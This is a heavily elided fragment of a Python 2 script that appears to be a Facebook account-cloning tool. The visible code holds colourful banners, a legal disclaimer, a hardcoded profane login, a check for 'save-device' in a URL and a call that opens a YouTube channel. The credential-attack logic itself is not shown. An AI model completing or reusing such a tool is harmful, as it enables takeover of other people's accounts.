...
jalan("Do you know?")
jalan("This tool singed by hero alom")
jalan("\033[1;91m Do everything on your own risk bara.")	
jalan("\033[1;93m I'm not responsible for any illegal activities.")
jalan("                                          ---\033[1;92mTomago vai")	


jalan("\033[1;96m◈===============◈      \033[1;92mLet's start bara    \033[1;96m◈===============◈")

CorrectUsername = "khankirpola"
CorrectPassword = "khankirpola"
	...
	try:
		...
		if 'save-device' in url:
			try:
				...
				unikers.close()
				print '\n\x1b[1;36;40m[✓] Login Successful.Please subscribe my Channel(N/A)'
				os.system('xdg-open https://youtube.com/channel/UCbuE5KCmKuCOcwUkTUw')
...
def pilih_super():
	...
	jalan('    \033[1;97mhero alom has started cloning please wait....')
	print  "  \033[1;36;48m ●══════════════════◄►══════════════════●" 
